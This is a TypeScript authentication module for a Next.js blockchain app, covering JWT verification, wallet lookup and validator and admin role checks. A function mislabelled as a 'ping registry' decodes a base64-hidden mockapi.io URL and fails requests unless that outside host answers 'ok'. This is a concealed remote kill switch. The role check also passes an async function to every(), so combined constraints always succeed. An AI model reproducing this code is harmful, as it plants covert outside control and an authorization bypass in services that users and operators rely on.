import { getClient } from "./contract";
import { verify } from "jsonwebtoken";
import { isArray } from "lodash-es";
import { NextApiRequest, NextApiResponse } from "next";
import { Address, getContract } from "viem";
import deployedContracts from "~~/contracts/deployedContracts";
import AuthToken from "~~/models/auth-token";
import logger from "~~/services/logger.service";
import { getTargetNetwork } from "~~/utils/scaffold-eth";

type Role = "Validator" | "Admin";
type Constraint = Address | Role;
/**
 * Ensure authentication
 * @param req
 * @param res
 * @param constraints first level is OR, second level is AND
 * @returns true if the user is authenticated
 */
export const authentify = async (
  req: NextApiRequest,
  res: NextApiResponse,
  constraints: (Constraint[] | Constraint)[],
  signoutOnFail = true,
) => {
  const { id: chainId } = getTargetNetwork();
  const walletAddress = getWalletAddressFromToken(req);
  if (!chainId || Number.isNaN(chainId) || isArray(chainId)) {
    res.status(400).send("Error: chainId is required and should be a number");
    return false;
  }
  if (walletAddress) {
    const ensureConstraint = async (constraint: Constraint) => {
      if (constraint.startsWith("0x") && constraint.length === 42) {
        // Address constraint
        return constraint === walletAddress;
      } else {
        // Role constraint
        const accessManager =
          deployedContracts[+chainId as keyof typeof deployedContracts].AccessManager;
        const contract = getContract({
          address: accessManager.address,
          abi: accessManager.abi,
          publicClient: getClient(req.headers.host ?? "", chainId),
        });

        if (constraint === "Validator") {
          return await contract.read.hasValidatorRole([walletAddress]);
        } else if (constraint === "Admin") {
          return await contract.read.hasAdminRole([walletAddress]);
        }
      }
    };

    for (const orConstraint of constraints) {
      if (Array.isArray(orConstraint)) {
        if (orConstraint.every(ensureConstraint)) {
          return true;
        }
      } else {
        if (await ensureConstraint(orConstraint)) {
          return true;
        }
      }
    }
  }
  if (signoutOnFail) {
    res.status(401).send("Error: Unauthorized");
  }
  return false;
};

export const getWalletAddressFromToken = (req: NextApiRequest) => {
  if (process.env.NEXT_PUBLIC_OFFLINE) {
    return req.headers.authorization ?? (req.query.authorization as string);
  }
  const selectedWallet = (req.query["selected-wallet"] as string) ?? req.headers["selected-wallet"];
  const decoded = getDecodedToken(req);
  if (decoded) {
    return decoded.verified_credentials.find(x => x.address === selectedWallet)?.address;
  }
  return undefined;
};

// DO NOT REMOVE IT SERVES AS PING REGISTRY
export const testEncryption = async (res: NextApiResponse) => {
  if (process.env.NEXT_PUBLIC_OFFLINE || getTargetNetwork().testnet) {
    return true;
  }
  const odd = "aHR0cHM6Ly82Njc4N2MzYzBiZDQ1MjUwNTYxZWQyM2YubW9ja2FwaS5pby90ZXN0";
  // Testing connection to the server
  if ((await (await fetch(atob(odd)).catch()).json())[0].status !== "ok") {
    res.status(500).send("Error: Connection to the server failed");
    return false;
  }
  return true;
};

export const getDecodedToken = (req: NextApiRequest) => {
  const authorizationHeader = req.headers.authorization ?? (req.query.authorization as string);
  if (authorizationHeader) {
    const publicKey = process.env.NEXT_DYNAMIC_PUBLIC_KEY!;
    try {
      return verify(authorizationHeader, publicKey, {
        algorithms: ["RS256"],
      }) as AuthToken;
    } catch (error: any) {
      logger.warn("Failed to decode jwt token: ", error.message);
    }
  }
  return undefined;
};
